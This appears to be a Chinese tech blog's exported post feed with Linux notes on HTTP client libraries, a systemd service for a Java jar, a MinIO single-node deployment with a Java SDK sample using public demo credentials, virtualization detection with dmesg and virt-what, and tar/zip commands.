<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">编译和运行</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> gcc test_curl.c -o <span class="built_in">test</span> -lcurl</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ./<span class="built_in">test</span> www.baidu.com</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><a href="https://github.com/EZLippi/Tinyhttpd" target="_blank" rel="noopener">Tinyhttpd</a><br>​Tinyhttpd 是J. David Blackstone在1999年写的一个不到 500 行的超轻量型 Http Server</p>
</li>
<li><p><a href="https://www.boa.org" target="_blank" rel="noopener">Boa</a><br>​Boa是一个非常小巧的web服务器,其可执行代码只有约60Kb</p>
</li>
<li><p><a href="http://www.fifi.org/doc/libghttp-dev/html/ghttp.html" target="_blank" rel="noopener">ghttp</a><br>官网没有下载了，但根据其他下载站来看，只有144KB，要源码可以去<a href="https://github.com/sknown/libghttp" target="_blank" rel="noopener">github</a>搜一下。<a href="http://blog.csdn.net/len_yue_mo_fu/article/details/75158686" target="_blank" rel="noopener">封装示例</a></p>
</li>
<li><p><a href="https://github.com/mrtazz/restclient-cpp" target="_blank" rel="noopener">C++ client for making HTTP/REST requests</a></p>
</li>
<li><p><a href="https://github.com/whoshuu/cpr" target="_blank" rel="noopener">C++ Requests: Curl for People</a></p>
</li>
<li><p><a href="https://github.com/tboox/tbox/blob/master/README_zh.md" target="_blank" rel="noopener">tbox的http模块</a> </p>
</li>
<li><p><a href="http://blog.csdn.net/hanbo622/article/details/51598724" target="_blank" rel="noopener">自己拼包</a></p>
</li>
<li><p><a href="https://github.com/getopenmono/mono_framework/tree/899a5820ac850a1f5b3b205bfe3892556ae064ca" target="_blank" rel="noopener">无意中发现的一个库，里面封装了一些 HTTPClient 和其他IO的库</a></p>
</li>
<li><p><a href="https://github.com/mrtazz/restclient-cpp" target="_blank" rel="noopener">C++ client for making HTTP/REST requests</a></p>
<p>​</p>
</li>
</ul>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux下jar包做成 systemctl 服务</title>
    <url>/Linux/Linux%E4%B8%8Bjar%E5%8C%85%E5%81%9A%E6%88%90%20systemctl%20%E6%9C%8D%E5%8A%A1/</url>
    <content><![CDATA[<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> vim /etc/systemd/system/myjar.service</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[Unit]</span><br><span class="line">Description=myjar-server</span><br><span class="line"><span class="meta">#</span><span class="bash">在哪个服务之后启动</span></span><br><span class="line">After=syslog.target network.target remote-fs.target nss-lookup.target</span><br><span class="line">[Service]</span><br><span class="line">Type=simple</span><br><span class="line">User=root</span><br><span class="line">Group=root</span><br><span class="line"><span class="meta">#</span><span class="bash">启动命令</span></span><br><span class="line"><span class="meta">#</span><span class="bash">ExecStart=java -jar /usr/<span class="built_in">local</span>/myjar.jar --spring.profiles.active=pro</span></span><br><span class="line">ExecStart=java -jar /usr/local/myjar.jar --spring.profiles.active=pro</span><br><span class="line"><span class="meta">#</span><span class="bash"> nohup命令无效</span></span><br><span class="line"><span class="meta">#</span><span class="bash">ExecStart=nohup java -jar /usr/<span class="built_in">local</span>/myjar.jar --spring.profiles.active=pro &gt;&gt;/usr/<span class="built_in">local</span>/myjar.log&amp;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ExecReload=/bin/kill -s HUP $MAINPID</span><br><span class="line">ExecStop=/bin/kill -s QUIT $MAINPID</span><br><span class="line">PrivateTmp=true</span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 开启开机启动</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> systemctl <span class="built_in">enable</span> myjar</span></span><br><span class="line">Created symlink /etc/systemd/system/multi-user.target.wants/myjar.service → /etc/systemd/system/myjar.service.</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看服务是否开机启动：</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> systemctl is-enabled myjar</span></span><br><span class="line">enabled</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 禁止开机启动</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> systemctl <span class="built_in">disable</span> myjar</span></span><br><span class="line">Removed /etc/systemd/system/multi-user.target.wants/myjar.service.</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看服务状态</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> systemctl status myjar </span></span><br><span class="line">● myjar.service - myjar-server</span><br><span class="line">     Loaded: loaded (/etc/systemd/system/myjar.service; disabled; vendor prese&gt;</span><br><span class="line">     Active: inactive (dead)</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看服务详情</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> systemctl show myjar</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 手动启动服务</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> systemctl start myjar</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 手动停止服务</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> systemctl stop myjar</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看日志</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> journalctl -u myjar</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title>Java-程序员眼中的-Linux</title>
    <url>/Linux/Java-%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9C%BC%E4%B8%AD%E7%9A%84-Linux/</url>
    <content><![CDATA[<p><a href="https://github.com/judasn/Linux-Tutorial" target="_blank" rel="noopener">https://github.com/judasn/Linux-Tutorial</a></p>
<h2 id="目录-Contents"><a href="#目录-Contents" class="headerlink" title="目录(Contents)"></a>目录(Contents)</h2><ul>
<li><a href="https://github.com/judasn/Linux-Tutorial/blob/master/Linux.md" target="_blank" rel="noopener">Linux 介绍</a></li>
<li><a href="https://github.com/judasn/Linux-Tutorial/blob/master/Ubuntu.md" target="_blank" rel="noopener">Ubuntu 介绍</a></li>
<li><a href="https://github.com/judasn/Linux-Tutorial/blob/master/Ubuntu-Install.md" target="_blank" rel="noopener">Ubuntu 安装</a></li>
<li><a href="https://github.com/judasn/Linux-Tutorial/blob/master/ubuntu-settings/ubuntu-settings-toc.md" target="_blank" rel="noopener">Ubuntu 设置（目录）</a></li>
<li><a href="https://github.com/judasn/Linux-Tutorial/blob/master/CentOS.md" target="_blank" rel="noopener">CentOS 介绍</a></li>
<li><a href="https://github.com/judasn/Linux-Tutorial/blob/master/CentOS-Install.md" target="_blank" rel="noopener">CentOS 6 安装</a></li>
<li><a href="https://github.com/judasn/Linux-Tutorial/blob/master/CentOS-7-Install.md" target="_blank" rel="noopener">CentOS 7 安装</a></li>
<li><a href="https://github.com/judasn/Linux-Tutorial/blob/master/CentOS6-and-CentOS7.md" target="_blank" rel="noopener">CentOS 6 和 CentOS 7 差异</a></li>
<li><a href="https://github.com/judasn/Linux-Tutorial/blob/master/centos-settings/centos-settings-toc.md" target="_blank" rel="noopener">CentOS 设置（目录）</a></li>
<li><a href="https://github.com/judasn/Linux-Tutorial/blob/master/Ubuntu-Install-VMware.md" target="_blank" rel="noopener">Ubuntu 安装 VMware</a></li>
<li><a href="https://github.com/judasn/Linux-Tutorial/blob/master/CentOS-Virtual-Machine-Copy-Settings.md" target="_blank" rel="noopener">VMware 克隆 CentOS 后网卡信息修改</a></li>
<li><a href="https://github.com/judasn/Linux-Tutorial/blob/master/Vim-Install-And-Settings.md" target="_blank" rel="noopener">Vim 安装、配置、快捷键列表</a></li>
<li><a href="https://github.com/judasn/Linux-Tutorial/blob/master/Bash.md" target="_blank" rel="noopener">Bash 命令</a></li>
<li><a href="https://github.com/judasn/Linux-Tutorial/blob/master/Bash-Other-Bash.md" target="_blank" rel="noopener">Bash 其他常用命令</a></li>
<li><a href="https://github.com/judasn/Linux-Tutorial/blob/master/Sed.md" target="_blank" rel="noopener">Sed 命令</a></li>
<li><a href="https://github.com/judasn/Linux-Tutorial/blob/master/File-Extract-Compress.md" target="_blank" rel="noopener">Linux 下常用压缩文件的解压、压缩</a></li>
<li><a href="https://github.com/judasn/Linux-Tutorial/blob/master/Off-line-Yum-Install.md" target="_blank" rel="noopener">Yum 下载安装包及对应依赖包</a></li>
<li><a href="https://github.com/judasn/Linux-Tutorial/blob/master/Zsh.md" target="_blank" rel="noopener">Zsh 入门</a></li>
<li><a href="https://github.com/judasn/Linux-Tutorial/blob/master/maintenance.md" target="_blank" rel="noopener">日常维护</a></li>
<li><a href="https://github.com/judasn/Linux-Tutorial/blob/master/Nmon.md" target="_blank" rel="noopener">nmon 系统性能监控工具</a></li>
<li><a href="https://github.com/judasn/Linux-Tutorial/blob/master/SSH.md" target="_blank" rel="noopener">SSH（Secure Shell）介绍</a></li>
<li><a href="https://github.com/judasn/Linux-Tutorial/blob/master/FTP.md" target="_blank" rel="noopener">FTP（File Transfer Protocol）介绍</a></li>
<li><a href="https://github.com/judasn/Linux-Tutorial/blob/master/VPN.md" target="_blank" rel="noopener">VPN（Virtual Private Network）介绍</a></li>
<li><a href="https://github.com/judasn/Linux-Tutorial/blob/master/NFS.md" target="_blank" rel="noopener">NFS（Network FileSystem）介绍</a></li>
<li><a href="https://github.com/judasn/Linux-Tutorial/blob/master/NTP.md" target="_blank" rel="noopener">NTP（Network Time Protocol）介绍</a></li>
<li><a href="https://github.com/judasn/Linux-Tutorial/blob/master/Samba.md" target="_blank" rel="noopener">Samba 介绍</a></li>
<li><a href="https://github.com/judasn/Linux-Tutorial/blob/master/Crontab.md" target="_blank" rel="noopener">Crontab 介绍</a></li>
<li><a href="https://github.com/judasn/Linux-Tutorial/blob/master/Iptables.md" target="_blank" rel="noopener">Iptables 介绍</a></li>
<li><a href="https://github.com/judasn/Linux-Tutorial/blob/master/Hsk-Install.md" target="_blank" rel="noopener">花生壳-安装介绍</a></li>
<li><a href="https://github.com/judasn/Linux-Tutorial/blob/master/JDK-Install.md" target="_blank" rel="noopener">JDK 安装</a></li>
<li><a href="https://github.com/judasn/Linux-Tutorial/blob/master/SVN-Install-And-Settings.md" target="_blank" rel="noopener">SVN 安装和配置</a></li>
<li><a href="https://github.com/judasn/Linux-Tutorial/blob/master/Tomcat-Install-And-Settings.md" target="_blank" rel="noopener">Tomcat 安装和配置、优化</a></li>
<li><a href="https://github.com/judasn/Linux-Tutorial/blob/master/Jenkins-Install-And-Settings.md" target="_blank" rel="noopener">Jenkins 安装和配置</a></li>
<li><a href="https://github.com/judasn/Linux-Tutorial/blob/master/Maven-Install-And-Settings.md" target="_blank" rel="noopener">Maven 安装和配置</a></li>
<li><a href="https://github.com/judasn/Linux-Tutorial/blob/master/Nexus-Install-And-Settings.md" target="_blank" rel="noopener">Nexus 安装和配置</a></li>
<li><a href="https://github.com/judasn/Linux-Tutorial/blob/master/Mysql-Install-And-Settings.md" target="_blank" rel="noopener">MySQL 安装和配置</a></li>
<li><a href="https://github.com/judasn/Linux-Tutorial/blob/master/Mysql-Optimize.md" target="_blank" rel="noopener">MySQL 优化</a></li>
<li><a href="https://github.com/judasn/Linux-Tutorial/blob/master/Mysql-Test.md" target="_blank" rel="noopener">MySQL 测试</a></li>
<li><a href="https://github.com/judasn/Linux-Tutorial/blob/master/Mysql-Tutorial.md" target="_blank" rel="noopener">MySQL 教程</a></li>
<li><a href="https://github.com/judasn/Linux-Tutorial/blob/master/Redis-Install-And-Settings.md" target="_blank" rel="noopener">Redis 安装和配置</a></li>
<li><a href="https://github.com/judasn/Linux-Tutorial/blob/master/MongoDB-Install-And-Settings.md" target="_blank" rel="noopener">MongoDB 安装和配置</a></li>
<li><a href="https://github.com/judasn/Linux-Tutorial/blob/master/Solr-Install-And-Settings.md" target="_blank" rel="noopener">Solr 安装和配置</a></li>
<li><a href="https://github.com/judasn/Linux-Tutorial/blob/master/Jira-Install-And-Settings.md" target="_blank" rel="noopener">Jira 安装和配置</a></li>
<li><a href="https://github.com/judasn/Linux-Tutorial/blob/master/Jenkins-Install-And-Settings.md" target="_blank" rel="noopener">Jenkins 安装和配置</a></li>
<li><a href="https://github.com/judasn/Linux-Tutorial/blob/master/TeamCity-Install-And-Settings.md" target="_blank" rel="noopener">TeamCity 安装和配置</a></li>
<li><a href="https://github.com/judasn/Linux-Tutorial/blob/master/Nginx-Install-And-Settings.md" target="_blank" rel="noopener">Nginx 安装和配置</a></li>
<li><a href="https://github.com/judasn/Linux-Tutorial/blob/master/FastDFS-Install-And-Settings.md" target="_blank" rel="noopener">FastDFS 安装和配置</a></li>
<li><a href="https://github.com/judasn/Linux-Tutorial/blob/master/FastDFS-Nginx-Lua-GraphicsMagick.md" target="_blank" rel="noopener">FastDFS 结合 GraphicsMagick</a></li>
<li><a href="https://github.com/judasn/Linux-Tutorial/blob/master/RabbitMQ-Install-And-Settings.md" target="_blank" rel="noopener">RabbitMQ 安装和配置</a></li>
<li><a href="https://github.com/judasn/Linux-Tutorial/blob/master/Openfire-Install-And-Settings.md" target="_blank" rel="noopener">Openfire 安装和配置</a></li>
<li><a href="https://github.com/judasn/Linux-Tutorial/blob/master/Rap-Install-And-Settings.md" target="_blank" rel="noopener">Rap 安装和配置</a></li>
<li><a href="https://github.com/judasn/Linux-Tutorial/blob/master/Nginx-Keepalived-Install-And-Settings.md" target="_blank" rel="noopener">Nginx + Keepalived 高可用</a></li>
<li><a href="https://github.com/judasn/Linux-Tutorial/blob/master/Was-Hacked.md" target="_blank" rel="noopener">黑客入侵检查</a></li>
<li><a href="http://code.youmeek.com/2016/08/19/2016/08/VPS/" target="_blank" rel="noopener">Shadowsocks 安装和配置</a></li>
<li><a href="https://github.com/judasn/Linux-Tutorial/blob/master/Mycat-Install-And-Settings.md" target="_blank" rel="noopener">Mycat 安装和配置</a></li>
<li><a href="https://github.com/judasn/Linux-Tutorial/blob/master/Zookeeper-Install.md" target="_blank" rel="noopener">Zookeeper 安装和配置</a></li>
<li><a href="https://github.com/judasn/Linux-Tutorial/blob/master/Daemontools.md" target="_blank" rel="noopener">Daemontools 工具介绍</a></li>
<li><a href="https://github.com/judasn/Linux-Tutorial/blob/master/Tmux-Install-And-Settings.md" target="_blank" rel="noopener">Tmux 安装和配置</a></li>
<li><a href="https://github.com/judasn/Linux-Tutorial/blob/master/ELK-Install-And-Settings.md" target="_blank" rel="noopener">ELK 日志收集系统安装和配置</a></li>
<li><a href="https://github.com/judasn/Linux-Tutorial/blob/master/Dubbo-Install-And-Settings.md" target="_blank" rel="noopener">Dubbo 安装和配置</a></li>
<li><a href="https://github.com/judasn/Linux-Tutorial/blob/master/Gitlab-Install-And-Settings.md" target="_blank" rel="noopener">GitLab 安装和配置</a></li>
<li><a href="https://github.com/judasn/Linux-Tutorial/blob/master/Docker-Install-And-Usage.md" target="_blank" rel="noopener">Docker 安装和使用</a></li>
<li><a href="https://github.com/judasn/Linux-Tutorial/blob/master/LDAP-Install-And-Settings.md" target="_blank" rel="noopener">LDAP 安装和使用</a></li>
<li><a href="https://github.com/judasn/Linux-Tutorial/blob/master/Alfresco-Install-And-Usage.md" target="_blank" rel="noopener">Alfresco 安装和使用</a></li>
</ul>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
  </entry>
  <entry>
    <title>Linux单机部署MinIO</title>
    <url>/Linux/Linux%E5%8D%95%E6%9C%BA%E9%83%A8%E7%BD%B2MinIO/</url>
    <content><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p><a href="https://min.io" target="_blank" rel="noopener">MinIO</a> 是在 <code>GNU Affero General Public License v3.0</code> 下发布的高性能对象存储。 兼容 <code>Amazon S3</code> 云存储服务接口。 </p>
<blockquote>
<p>由于兼容S3，后期数据量大不想自己维护，可以很方便的切换到其他的对象存储云服务（如：Amazon S3 、阿里OSS、 腾讯云等）</p>
</blockquote>
<h2 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h2><p>MinIO不但支持分布式部署，还提供了与k8s、etcd、docker等容器化技术深度集成方案。<br>但是单机的MinIO服务器最适合早期开发和评估，这里也是已部署单机为例。</p>
<h3 id="1-容器部署"><a href="#1-容器部署" class="headerlink" title="1. 容器部署"></a>1. 容器部署</h3><ul>
<li><p>官网推荐用podman</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">podman run -p 9000:9000 -p 9001:9001 \</span><br><span class="line">  quay.io/minio/minio server /data --console-address <span class="string">":9001"</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>docker</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker pull minio/minio</span><br><span class="line">docker run \</span><br><span class="line">  -p 9000:9000 \</span><br><span class="line">  -p 9001:9001 \</span><br><span class="line">  -e <span class="string">"MINIO_ROOT_USER=AKIAIOSFODNN7EXAMPLE"</span> \</span><br><span class="line">  -e <span class="string">"MINIO_ROOT_PASSWORD=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"</span> \</span><br><span class="line">  quay.io/minio/minio server /data --console-address <span class="string">":9001"</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<blockquote>
<p><a href="https://docs.min.io/docs/minio-docker-quickstart-guide.html" target="_blank" rel="noopener">【官网指引】</a></p>
</blockquote>
<h3 id="2-二进制单机部署"><a href="#2-二进制单机部署" class="headerlink" title="2. 二进制单机部署"></a>2. 二进制单机部署</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">wget https://dl.min.io/server/minio/release/linux-amd64/minio</span><br><span class="line">chmod +x minio</span><br><span class="line">./minio server ./data  <span class="comment"># ./data是数据存储的位置，这里是同目录的data目录下</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 下面是控制台信息打印</span></span><br><span class="line">API: http://192.168.0.223:9000  http://127.0.0.1:9000     </span><br><span class="line">RootUser: minioadmin </span><br><span class="line">RootPass: minioadmin </span><br><span class="line"></span><br><span class="line">Console: http://192.168.0.223:43404 http://127.0.0.1:43404   </span><br><span class="line">RootUser: minioadmin </span><br><span class="line">RootPass: minioadmin </span><br><span class="line"></span><br><span class="line">Command-line: https://docs.min.io/docs/minio-client-quickstart-guide</span><br><span class="line">   $ mc <span class="built_in">alias</span> <span class="built_in">set</span> myminio http://192.168.0.223:9000 minioadmin minioadmin</span><br><span class="line"></span><br><span class="line">Documentation: https://docs.min.io</span><br><span class="line"></span><br><span class="line">WARNING: Console endpoint is listening on a dynamic port (43404),</span><br><span class="line"> please use --console-address <span class="string">":PORT"</span> to choose a static port.</span><br><span class="line">WARNING: Detected default credentials <span class="string">'minioadmin:minioadmin'</span>,</span><br><span class="line"> we recommend that you change these values with <span class="string">'MINIO_ROOT_USER'</span> </span><br><span class="line"> and <span class="string">'MINIO_ROOT_PASSWORD'</span> environment variables</span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>--console-address &quot;:9001&quot;</code> 可以指定Web控制台Dashboard的端口</p>
</blockquote>
<p><img src="/images/linux/MinIO_Login.png" alt="登录界面"><br><img src="/images/linux/MinIO_Dashboard.png" alt="Dashboard"></p>
<h2 id="Client-SDK"><a href="#Client-SDK" class="headerlink" title="Client SDK"></a>Client SDK</h2><p>MinIO 的客户端(mc)是和S3一样的命令行工具。<br>MinIO 提供了 <code>Java</code>、<code>JavaScript</code>、<code>Python</code>、<code>Golang</code>、<code>.Net</code> 等各种语言的SDK。</p>
<p>以 <a href="https://docs.min.io/docs/java-client-quickstart-guide.html" target="_blank" rel="noopener">Java SDK </a> 为例：</p>
<ul>
<li><p>Maven依赖</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.minio<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>minio<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.3.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>Gradle依赖</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"><span class="keyword">dependencies</span> &#123;</span><br><span class="line">    <span class="keyword">compile</span> <span class="string">'io.minio:minio:8.3.0'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>为了连接到对象存储服务器，需要以下三个参数：</p>
<table>
<thead>
<tr>
<th>Parameters</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>Endpoint</td>
<td>URL to S3 service.</td>
</tr>
<tr>
<td>Access Key</td>
<td>Access key (aka user ID) of an account in the S3 service.</td>
</tr>
<tr>
<td>Secret Key</td>
<td>Secret key (aka password) of an account in the S3 service.</td>
</tr>
</tbody>
</table>
<p>示例代码：</p>
<blockquote>
<p>这个例子使用了MinIO服务器 <a href="https://play.min.io" target="_blank" rel="noopener">https://play.min.io</a> ，请随意使用此服务进行测试和开发。 </p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> io.minio.BucketExistsArgs;</span><br><span class="line"><span class="keyword">import</span> io.minio.MakeBucketArgs;</span><br><span class="line"><span class="keyword">import</span> io.minio.MinioClient;</span><br><span class="line"><span class="keyword">import</span> io.minio.UploadObjectArgs;</span><br><span class="line"><span class="keyword">import</span> io.minio.errors.MinioException;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.security.InvalidKeyException;</span><br><span class="line"><span class="keyword">import</span> java.security.NoSuchAlgorithmException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FileUploader</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">      <span class="keyword">throws</span> IOException, NoSuchAlgorithmException, InvalidKeyException </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="comment">// Create a minioClient with the MinIO server playground, its access key and secret key.</span></span><br><span class="line">      MinioClient minioClient =</span><br><span class="line">          MinioClient.builder()</span><br><span class="line">              .endpoint(<span class="string">"https://play.min.io"</span>)</span><br><span class="line">              .credentials(<span class="string">"Q3AM3UQ867SPQQA43P2F"</span>, <span class="string">"zuf+tfteSlswRu7BJ86wekitnifILbZam1KYY3TG"</span>)</span><br><span class="line">              .build();</span><br><span class="line"></span><br><span class="line">      <span class="comment">// Make 'asiatrip' bucket if not exist.</span></span><br><span class="line">      <span class="keyword">boolean</span> found =</span><br><span class="line">          minioClient.bucketExists(BucketExistsArgs.builder().bucket(<span class="string">"asiatrip"</span>).build());</span><br><span class="line">      <span class="keyword">if</span> (!found) &#123;</span><br><span class="line">        <span class="comment">// Make a new bucket called 'asiatrip'.</span></span><br><span class="line">        minioClient.makeBucket(MakeBucketArgs.builder().bucket(<span class="string">"asiatrip"</span>).build());</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">"Bucket 'asiatrip' already exists."</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// Upload '/home/user/Photos/asiaphotos.zip' as object name 'asiaphotos-2015.zip' to bucket</span></span><br><span class="line">      <span class="comment">// 'asiatrip'.</span></span><br><span class="line">      minioClient.uploadObject(</span><br><span class="line">          UploadObjectArgs.builder()</span><br><span class="line">              .bucket(<span class="string">"asiatrip"</span>)</span><br><span class="line">              .object(<span class="string">"asiaphotos-2015.zip"</span>)</span><br><span class="line">              .filename(<span class="string">"/home/user/Photos/asiaphotos.zip"</span>)</span><br><span class="line">              .build());</span><br><span class="line">      System.out.println(</span><br><span class="line">          <span class="string">"'/home/user/Photos/asiaphotos.zip' is successfully uploaded as "</span></span><br><span class="line">              + <span class="string">"object 'asiaphotos-2015.zip' to bucket 'asiatrip'."</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (MinioException e) &#123;</span><br><span class="line">      System.out.println(<span class="string">"Error occurred: "</span> + e);</span><br><span class="line">      System.out.println(<span class="string">"HTTP trace: "</span> + e.httpTrace());</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="扩展资料"><a href="#扩展资料" class="headerlink" title="扩展资料"></a>扩展资料</h2><p><a href="https://tonybai.com/2020/03/16/build-high-performance-object-storage-with-minio-part1-prototype/" target="_blank" rel="noopener">【使用minio搭建高性能对象存储-第一部分：原型】</a></p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>minio</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux查看主机使用哪种虚拟化平台</title>
    <url>/Linux/Linux%E6%9F%A5%E7%9C%8B%E4%B8%BB%E6%9C%BA%E4%BD%BF%E7%94%A8%E5%93%AA%E7%A7%8D%E8%99%9A%E6%8B%9F%E5%8C%96%E5%B9%B3%E5%8F%B0/</url>
    <content><![CDATA[<p>我们知道在亚马逊云、阿里云或者腾讯云购买的主机都是通过虚拟技术将物理机虚拟出来的，而流行虚拟化平台有：VMWare、Xen 和 KVM等，如果想知道他们是采用了哪种虚拟化平台，要怎么做呢？</p>
<h2 id="dmesg命令"><a href="#dmesg命令" class="headerlink" title="dmesg命令"></a>dmesg命令</h2><p>如果主机装的是Linux系统，可以通过以下命令行确认平台<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ dmesg | egrep &quot;kvm|xen|vmware&quot;</span><br></pre></td></tr></table></figure></p>
<p>运行结果如下：</p>
<ol>
<li><p>vmware虚拟机</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">	[    0.000000] vmware: TSC freq read from hypervisor : 2904.000 MHz</span><br><span class="line">	[    0.000000] vmware: Host bus clock speed read from hypervisor : 66000000 Hz</span><br><span class="line">	[    0.000000] vmware: using sched offset of 6513244607 ns</span><br><span class="line">	[    5.378124] systemd[1]: Detected virtualization vmware.</span><br><span class="line">	``` </span><br><span class="line">2. 阿里云ECS(2019年购买)</span><br></pre></td></tr></table></figure>
<p> [    0.000000] kvm-clock: cpu 0, msr 0:7ff34001, primary cpu clock<br> [    0.000000] kvm-clock: Using msrs 4b564d01 and 4b564d00<br> [    0.000000] kvm-clock: using sched offset of 690581591653318 cycles<br> [    0.000000] clocksource: kvm-clock: mask: 0xffffffffffffffff max_cycles: 0x1cd42e4dffb, max_idle_ns: 881590591483 ns<br> [    0.000000] kvm-stealtime: cpu 0, msr 7fc24040<br> [    0.116255] clocksource: Switched to clocksource kvm-clock<br> [    1.789279] systemd[1]: Detected virtualization kvm.</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">3. 	Xen平台没有相关的测试环境</span><br><span class="line">	据说亚马逊云和阿里云早期都是采用Xen，KVM发展起来之后，大部分云产商都转向KVM了。所以只有比较早购买的阿里云主机才是Xen平台的，亚马逊云由于历史原因，迁移到KVM比较慢，所以可能还存在比较多的Xen主机。</span><br><span class="line"></span><br><span class="line">## 安装	virt-what</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>$ apt-get install virt-what<br>$ yum install virt-what<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">运行 `virt-what` 这个软件，直接可以输出虚拟平台</span><br><span class="line"></span><br><span class="line">1. vmware虚拟机</span><br></pre></td></tr></table></figure></p>
<pre><code>$ virt-what
vmware
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2. 阿里云ECS(2019年购买)</span><br></pre></td></tr></table></figure>

$ virt-what
kvm
```
</code></pre>]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>kvm</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux（Ubuntu）-常用命令</title>
    <url>/Linux/Linux%EF%BC%88Ubuntu%EF%BC%89-%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<h2 id="压缩打包"><a href="#压缩打包" class="headerlink" title="压缩打包"></a>压缩打包</h2><h4 id="tar"><a href="#tar" class="headerlink" title="tar"></a>tar</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 仅打包(不压缩)</span></span><br><span class="line">$ tar -cvf /tmp/etc.tar /etc</span><br><span class="line"><span class="comment"># gzip格式压缩（ z参数 .tar.gz 或 .tgz）</span></span><br><span class="line">$ tar -czvf /tmp/etc.tar.gz /etc</span><br><span class="line"><span class="comment"># bzip2格式压缩（j 参数 .tar.bz2）</span></span><br><span class="line">$ tar -cjvf /tmp/etc.tar.bz2 /etc</span><br></pre></td></tr></table></figure>
<h4 id="zip-打包目录"><a href="#zip-打包目录" class="headerlink" title="zip 打包目录"></a>zip 打包目录</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ zip -r -o -9  test.zip <span class="built_in">test</span>/</span><br></pre></td></tr></table></figure>
<p>-r 递归 ，-o 输出文件 ， -9 压缩比例(1~9)</p>
